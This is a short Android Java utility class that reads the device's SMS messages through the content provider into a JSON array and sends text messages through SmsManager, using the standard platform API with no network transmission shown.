package com.hhm.android.otherapp.managers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * @author huangche
 * @date 2020/11/12
 * 短信内容获取
 */
public class SMSManager {
    public static final String TAG = "SMSManager";

    public static JsonArray getSMSList(Context context, int num){
        String sortOrder = (num == 0) ?  "date DESC" : "date DESC limit " + String.valueOf(num);
        JsonArray list = new JsonArray();
        String[] projection = new String[] { "_id", "address", "person", "body", "date", "type" };
        try {
            Uri uriSMSURI = Uri.parse("content://sms/");
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cur = contentResolver.query(uriSMSURI, projection, null, null, sortOrder); //"date DESC limit 2"
            if (cur!=null){
                while (cur.moveToNext()) {
                    JsonObject sms = new JsonObject();
                    String _id = cur.getString(cur.getColumnIndex("_id"));
                    String address = cur.getString(cur.getColumnIndex("address"));
                    Long time = cur.getLong(cur.getColumnIndex("date"));
                    String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(time));
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    int type = cur.getInt(cur.getColumnIndex("type"));
                    sms.addProperty("sms_id" , _id);
                    sms.addProperty("phoneNo" , address);
                    sms.addProperty("sms_date",date);
                    sms.addProperty("sms_msg" , body);
                    sms.addProperty("sms_type",type);
                    list.add(sms);
                }
                cur.close();
                return list;
            }
        } catch (Exception e){
            return null;
        }
        return null;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }


}
